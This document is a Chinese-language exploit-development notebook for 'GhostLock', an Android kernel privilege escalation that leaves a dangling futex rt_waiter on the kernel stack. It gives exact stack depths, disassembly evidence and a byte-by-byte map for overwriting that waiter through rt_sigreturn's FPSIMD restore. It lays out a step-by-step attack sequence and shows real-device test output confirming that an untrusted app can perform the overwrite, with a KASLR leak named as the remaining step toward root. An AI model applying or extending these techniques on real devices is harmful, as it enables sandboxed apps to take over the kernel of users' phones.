# GhostLock 覆盖层几何 **重算**（设备同构建, 2026-09-27）

对象: `5.4.281-qgki-g2a88cd145def` 裸 Image (`analysis/kernel_dev_g2a88cd145def.bin`,
`base=0xffffffc010080000`) + 本机内嵌 kallsyms (`analysis/kallsyms_g2a88cd145def.txt`, 179,181 行)。
所有数字都是**本机反汇编实测**，不再是推算。约定沿用 09-24: **地址 = S0 − 深度**，
S0 = 进入该 syscall 的 C 层入口函数(`__arm64_sys_*`)时的 sp。

## 0. 本文推翻了三条旧结论

| 旧结论(09-24/09-26) | 新事实 | 证据 |
|---|---|---|
| 需要覆盖的深度窗口 **[0x248, 0x298]** | **[0x269, 0x2B8]**（整体深了 0x20） | `0xC0+0xD0+0x1A0 = 0x350`，`0x350 − 0x98 = 0x2B8`；旧文档把减法算成了 0x298 |
| **ppoll 深度够**（0x3D0，"覆盖✓但 revents 写坏指针"） | **ppoll 深度根本不对**：栈上 chunk 只有 **30 个 entry**，位于 sp+0x5c ⇒ 覆盖 **[0x36c, 0x454]**，比目标**深了 0x1B4**；而且 revents 的写是**无条件**的（连负 fd 都写） | 见 §3 |
| 各通道上限靠手挑（pselect6 0x210、tty 0x208、kgsl 0x178…） | 已换成**全量枚举**：从所有 `__arm64_sys_*` 根做无环 DFS，累计真实栈帧，解析拷贝目的寄存器 ⇒ `stackchan_dump.tsv` 1955 条候选 | 见 §4 |

另外发现**工具 bug**（§6）：`kdis.py` 的 `callers` 用错了 bl 掩码，导致**过去所有"N 处调用者"计数全部无效**。

## 1. 悬空 rt_waiter 的真实落点（实测）

```
__arm64_sys_futex        frame = 0x0c0      (sub sp,sp,#0xc0)
do_futex                 frame = 0x0d0      (bl futex_wait_requeue_pi @0x3e6b24, 不是尾调用)
futex_wait_requeue_pi    frame = 0x1a0      (sub sp,sp,#0x1a0)
  rt_waiter  = sp + 0x98  ← 一手证据: add x0,sp,#0x98 ; add x26,sp,#0x98 ; bl rt_mutex_init_waiter
  futex_q q  = sp + 0x00  (序言把 0x80 字节的 futex_q_init 从 .data 搬进来)
Σ_futex = 0x350  ⇒  rt_waiter+0 在深度 0x350 − 0x98 = **0x2B8**
```

字段深度（`sizeof(rt_mutex_waiter)=0x50`，字段偏移 task@0x30 lock@0x38 prio@0x40 deadline@0x48）:

| 字段 | waiter 内偏移 | 深度(byte0) | 深度区间 |
|---|---|---|---|
| `tree.__rb_parent_color` | 0x00 | **0x2B8** | [0x2B1,0x2B8] |
| `tree.right` | 0x08 | 0x2B0 | [0x2A9,0x2B0] |
| `tree.left` | 0x10 | 0x2A8 | [0x2A1,0x2A8] |
| `pi_tree.pc` | 0x18 | 0x2A0 | [0x299,0x2A0] |
| `pi_tree.right` | 0x20 | 0x298 | [0x291,0x298] |
| `pi_tree.left` | 0x28 | 0x290 | [0x289,0x290] |
| `task` | 0x30 | 0x288 | [0x281,0x288] |
| `lock` | 0x38 | 0x280 | [0x279,0x280] |
| `prio` | 0x40 | 0x278 | [0x275,0x278] |
| `deadline` | 0x48 | 0x270 | [0x269,0x270] |

⇒ **整个对象占深度 [0x269, 0x2B8]，且 rb_tree 三 qword 在最深端 [0x2A1, 0x2B8]。**

## 2. 通道的覆盖条件（把问题写成一句话）

一个通道 = 某函数 F（在 syscall 链上，累计栈帧 Σ）把 L 字节用户数据拷进 `sp_F + o`。
它覆盖深度 **[Σ−o−L+1, Σ−o]**（byte0 最深）。要吃下整个 waiter:

```
Σ − o ≥ 0x2B8            (盖住 tree.pc)
Σ − o − L + 1 ≤ 0x269    (盖住 deadline)  ⇔  L ≥ (Σ−o) − 0x268
(Σ − o − 0x2B8) ≡ 0 (mod 8)   (对齐, 否则 qword 跨界)
必须是单向(内核不回写同一区域)且 app 域可调用
```

⇒ 允许"起点比 0x2B8 更深"，只要拷贝足够长。ppoll 就是死在这条长度上（要 L≥0x1EC，实际 0xF0）。

## 3. ppoll / poll 判死（两条独立理由，都一手）

`do_sys_poll@0xffffffc01059b370`，`frame = 0x430`（`stp x29,x30,[sp,#-0x60]!` + `sub sp,sp,#0x3d0`）。

1. **容量**: `cmp w20,#0x1e` + `mov w8,#0x1e` + `csel w23,w20,w8,lo` ⇒ **栈上 chunk 只装 min(n,30) 个 pollfd**；
   剩余部分 `cmp x19,#0x1fe` + `__kmalloc(8*cnt+0x10, 0xcc0)` ⇒ **第 2 个 chunk 起在堆上，不在栈上**
   （09-24 的"ppoll 覆盖 [0xA0,0x3D0]"就是把所有 chunk 当成栈上了）。
2. **落点**: `add x24,sp,#0x50`（chunk 基址）+ `add x20,x24,#0xc`（entries 偏移 0xc，因 `count` 是 int）
   ⇒ entries 在 **[sp+0x5c, sp+0x14c)** ⇒ Σ_ppoll = 0x80+0x430 = 0x4B0 ⇒ 覆盖 **[0x365, 0x454]**，
   且 `0x5c ≡ 4 (mod 8)` **对齐也差 4**。
3. 顺带把 revents 彻底钉死: `ldur w0,[x28,#-6]; tbnz w0,#0x1f → strh wzr,[x28]`（负 fd **写 0**）、
   `__fdget` 失败分支 `mov w8,#0x20; strh w8,[x28]`（**写 POLLNVAL**）、正常分支 `strh w19,[x28]`
   ⇒ **每个 entry 的第 6..7 字节一定被内核改写**，没有"用负 fd 绕开"这条路。

## 4. 全量枚举的结果（`stackdepth.py` → `stackchan_dump.tsv`）

规模: 帧表 99,205 个函数、调用边 422,220 条、含拷贝调用的函数 861 个、能到达它们的函数 85,065 个。
根 = 全部 `__arm64_sys_*` / `__arm64_compat_sys_*`，DFS 深度 ≤9，Σ 上限 0x700。

**深端 ≥ 0x268 的原生通道只有 7 类**（`rsc_boost_lock_blockchain_int` 的成批命中是同名符号边界
造成的伪路径，已剔除；`compat` 单列）:

| 深端 | Σ | o | 需要的 L | holder / copy | 根 syscall | 判定 |
|---|---|---|---|---|---|---|
| 0x268 | 0x270 | 0x8 | 0x0 | `__sys_sendmmsg` / `copy_msghdr_from_user` | sendmmsg | **差 0x50**，且 msghdr 只有 0x30 |
| 0x2C0 | 0x310 | 0x50 | 0x57 | `bpf_prog_get_info_by_fd` | bpf | **EACCES**（app 无 bpf） |
| 0x2D8 | 0x2E0 | 0x8 | 0x6f | `get_timespec64` | io_uring_enter | L=0x10，覆盖 [0x2C9,0x2D8]——**落在窗口之外(更深)** |
| 0x300 | 0x310 | 0x10 | 0x97 | `restore_sve_fpsimd_context` | rt_sigreturn | **本机 CPU 无 SVE**（cpuinfo Features 无 `sve`）⇒ 路径不执行 |
| 0x434 | 0x490 | 0x5c | 0x1cb | `do_sys_poll` | poll/ppoll | 见 §3，L 只有 0xF0 |
| 0x450 | 0x4C0 | 0x70 | 0x1e7 | `__sys_recvmsg_sock` | (内核内部调用) | 非 EL0 入口 |
| 0x478 | 0x480 | 0x8 | 0x20f | `__sys_sendmsg_sock` | (内核内部调用) | 非 EL0 入口 |

对照旧通道（本次用真实帧重算，含 `[sp,#-N]!` 压栈区）:
`pselect6`: Σ = 0x10+0x90+0x1C0 = 0x260，内联 bits 基址 = sp+0x50（序言 `stp xzr,xzr,[sp,#0x50]…[sp,#0x140]`
清 0x100 字节 = SELECT_STACK_ALLOC）⇒ **深端 0x210** ⇒ 与 09-24 实测一致 ✅（工具的约定在此得到独立验证），
对新窗口 [0x269,0x2B8] 差 **0x58**。

compat 侧（需要 32 位进程，另算）: `get_compat_msghdr`/`__sys_sendmmsg` 深端 0x278/0x2C8/0x2D8/0x2F8，
L ≤ 0x30 ⇒ 要么太浅要么**越过**窗口。

## 4b. ★★ 覆盖通道找到了：`rt_sigreturn` 的 FPSIMD 上下文回存（本文真正的产出）★★

前 4 节的枚举把长度 L 当未知数，因此漏掉了这条 —— 手工复核 `restore_fpsimd_context` 后确认它是**完整可用**的：

```
__arm64_sys_rt_sigreturn   frame = 0x30   (stp x29,x30,[sp,#-0x30]!)
  -> restore_sigframe@0x102b6774  frame = 0x60     (bl 点 __arm64_sys_rt_sigreturn+0xa0)
    -> restore_fpsimd_context@0x102b849c  frame = 0x30 + 0x220 = 0x250
Σ = 0x30 + 0x60 + 0x250 = **0x340**
局部缓冲: memset(sp, 0, **0x210**) ⇒ `struct user_fp_state fpstate` 就在 **sp + 0x00**
拷贝点 0xffffffc0102b87d8:  mov x0, sp / mov w2, #0x200 / bl __arch_copy_from_user   ← v[32] 原样入栈
另一处 0x10 的拷贝放 fcr/fpsr ⇒ 合计 0x210 全部为用户可控字节
前置校验(0x102b8734..0x102b8750): head.magic 必须 = 0x46508001(FPSIMD_MAGIC)，head.size 必须 = **0x210**
                                  —— 校验的是"帧里的记录头"，**不是 v[] 的内容**；v0..v31 无任何过滤
```

⇒ 覆盖深度 **[0x340 − 0x210 + 1, 0x340] = [0x131, 0x340]**，对齐 `(0x340 − 0x2B8) = 0x88 ≡ 0 (mod 8)` ✅
⇒ **整个悬空 rt_waiter [0x269, 0x2B8] 被 0x50 个"完全由我们选的 8 字节"覆盖。**

字节映射（局部偏移 i ↔ 深度 0x340−i；waiter 第 j 字节 ↔ i = 0x88 + j）:

| waiter 字段 | 深度 | 局部偏移 i | 落在哪个 fpsimd 字段 |
|---|---|---|---|
| `tree.pc` | 0x2B8 | 0x88 | v8 高 8 字节 |
| `tree.right` | 0x2B0 | 0x90 | v9 |
| `tree.left` | 0x2A8 | 0x98 | v10 |
| `pi_tree.pc` | 0x2A0 | 0xA0 | v11 |
| `pi_tree.right` | 0x298 | 0xA8 | v12 |
| `pi_tree.left` | 0x290 | 0xB0 | v13 |
| `task` | 0x288 | 0xB8 | v14 |
| `lock` | 0x280 | 0xC0 | v15 |
| `prio` | 0x278 | 0xC8 | v16 高 8 字节 |
| `deadline` | 0x270 | 0xD0 | v17 |

（v 的具体源偏移还要按 `struct target_fpsimd_context` 实际布局钉一遍：内核从 `x19+0x10` 拷 v 块、
从 `x19+0x8` 拷 0x10 字节的 fcr/fpsr —— 做载荷时以实测为准。）

**为什么它是"单向"**：`fpstate` 是纯栈局部，内核拷完只做 `write_fpsimd_regs(current, &fpstate)` 方向
= 栈→task 结构，**再没有别的写**；拷贝之后函数体只做校验与返回。

**为什么 app 能用**：`rt_sigreturn` 是普通 syscall（__NR_rt_sigreturn=139），untrusted_app 域必须放行
（bionic 的信号返回桩本身就靠它）；帧完全由我们在**用户栈**上伪造，`regs->sp` 指哪由我们定；
唯一"副作用"是成功路径会把 pc/ucr/GPR 也按帧里写的值恢复 —— 那正是我们自己选的续跑地址，可控。

**时序（取代 cm54 的 pselect6 方案）**：
1. W 线程跑 ghost 拓扑（`FUTEX_WAIT_REQUEUE_PI` + `CMP_REQUEUE_PI` ⇒ -EDEADLK 回滚 ⇒ `W->pi_blocked_on` 悬空），返回用户态。
2. W 用汇编桩把 sp 切到伪造帧，`svc #139` ⇒ 内核把 0x210 字节写进 [0x131,0x340] ⇒ 覆盖成功。
3. 帧里的 pc 指向 W 的**用户态忙等自旋** ⇒ W 从此不再进内核 ⇒ 内核栈那 0x50 字节一直保持我们的载荷
   （这是关键：旧方案担心的"parking 会盖掉载荷"在这里不存在，因为**自旋不进内核**）。
4. R 线程 `sched_setscheduler(W,...)` ⇒ `rt_mutex_adjust_pi(W)` 读 `W->pi_blocked_on` ⇒ 按我们的假 waiter 走链。
5. 风险: 硬中断在 W 自旋期间进来会踩到同一段栈 ⇒ **载荷要反复重喷**（sigreturn 循环），punch 也反复发。

## 4c. ★ 真机已验证（P72b, 2026-09-27 01:24）★

```
== P72b: rt_sigreturn 的 fpsimd 入栈拷贝能否当 GhostLock 覆盖通道 ==
---- 档 全对(实验) (mode=3) ----
[RESUMED] 帧被完整接受(pc/sp 来自 frame+0x238/+0x230)
[RESUMED] v8={5e0b0002,5e0ba112} v9={5e0b0003,5e0ba113} v15={5e0b0009,5e0ba119}
          | 期望 v9={5e0b0003,5e0ba113} ⇒ J1=入栈拷贝确实执行
---- 档 无记录(对照) (mode=0) ----
[SIG11] v8={ded00002,...} ⇒ J1=没恢复            ← 对照组干净, 判据不是恒真
```
结论：
* `untrusted_app` 域**可以**直接 `svc #139` 并用完全伪造的用户栈帧走完整条
  `restore_sigframe → restore_fpsimd_context` 路径（seccomp 不挡 139；帧被接受）；
* 我们写进帧 `v[]` 的哨兵**确实被内核原样拷进它自己的栈局部再恢复回线程** ⇒
  那次 0x210 字节的"用户数据→内核栈"拷贝在本机、在本域、在我们选的线程上**成立**；
* 顺带用"逐槽哨兵 + tombstone"一次解出 sigcontext 真实偏移：
  `regs[0]@frame+0x138, regs[19]@0x1d0, regs[29]@0x220, regs[30]@0x228, sp@0x230, pc@0x238,
   pstate@0x240, __reserved@0x250`（旧猜测全部差 8 字节，P72 第一版因此崩在 pc=0）；
* sigreturn 成功会把 x0 强制清 0（不能拿 regs[0] 当成功标记）；`ss_flags=SS_DISABLE` 可跳过
  altstack 校验；帧必须整体 16 字节对齐且 access_ok 长度 0x1250。

**还差的最后两环**（都不是"通道"问题）：
1. **本次开机的 KASLR slide**：假 waiter 的 `lock`(深度 0x280 ↔ 局部 0xC0 = v15 低半) 与
   `tree.pc` 都必须是**真内核地址**；
2. punch 期间的**载荷保持**：W 喷完后只在用户态自旋（不进内核 ⇒ 栈不被自己的帧改写）；
   硬中断从 EL0 进来会复用同一段内核栈 ⇒ 用"持续重喷 + 反复 punch"覆盖该窗口。

## 5. 结论（2026-09-27 修正版）

* **"栈覆盖层"这条路在本机不是"还没找到通道"，而是被量化地关掉了**：
  原生 app 可达的最深可控拷贝是 0x268（sendmmsg 的 msghdr）与 0x210（pselect6 的 bits），
  而 tree 三 qword 在 [0x2A1,0x2B8]；能"够深"的通道（ppoll 0x454）长度不足且对齐错位。
  即 **窗口 [0x2A1,0x2B8] 落在"可达拷贝深度"的空档里**，且这个空档现在两侧都有上界/下界。
* 还没穷尽的缝隙: **只经间接调用(fops/ops 表)到达的驱动处理函数**不在静态调用图里
  （ioctl 链上 syscall 侧累计只有 Σ≈0x80，驱动侧若有 0x240 的大帧+0x50 的单向拷贝就能命中）。
  ⇒ 正在用本项目已有的 `ioctl165_inv.txt`（165 个 app 可达 ioctl handler）作间接根补测。
* 不影响的事实: ghost 本身在真机上已成立（errno 35）；缺的自始至终是**写通道**，
  所以 GAP-TO-ROOT 的选项 (a)"非栈写通道"仍是唯一主线（binder/ashmem 线）。

## 6. 工具与勘误（要记住的坑）

1. **`kdis.py callers` 的 bl 掩码写错**（`(ins & 0x7c000000) == 0x94000000` 永假，正确是 `0xfc000000`）
   ⇒ 过去任何用 `callers` 得到的"调用者数量/只有 N 处"的结论**都是无效的**
   （例: "全二进制只有一条 ghost 路径"、"`callers futex_wait_requeue_pi` = 0 命中"其实是掩码问题）。
   已修正；用修正版重测: `do_futex → futex_wait_requeue_pi` 是 **bl**（不是尾调用），
   `_copy_from_user`/`move_addr_to_kernel` 等真实边数 422,220。
2. **`frame()` 必须把 `[sp,#-N]!` 的压栈区算进栈帧**：漏掉时 `do_sys_poll` 会被算成 0x3d0（真值 0x430），
   所有通道深度系统性偏浅 ~0x50。第一次跑枚举就因为这个漏掉了 ppoll/select 整族。
3. `stackdepth.py` 新增能力: 帧表+边表缓存(`.stackdepth_cache.json.gz`)、反向解析
   `add/mov/ldr-from-slot/reg+imm` 链求"拷贝目的 = sp+o"、`can-reach-a-copy` 裁剪、
   尾调用(`b func`)按"弹出调用者帧"处理 Σ。已知不足: 长度 L 不解析(人工判)、间接调用不入图。

产物: `analysis/stackdepth.py`、`analysis/stackchan_dump.tsv`(1955 行候选)、`analysis/stacksig.tsv`。
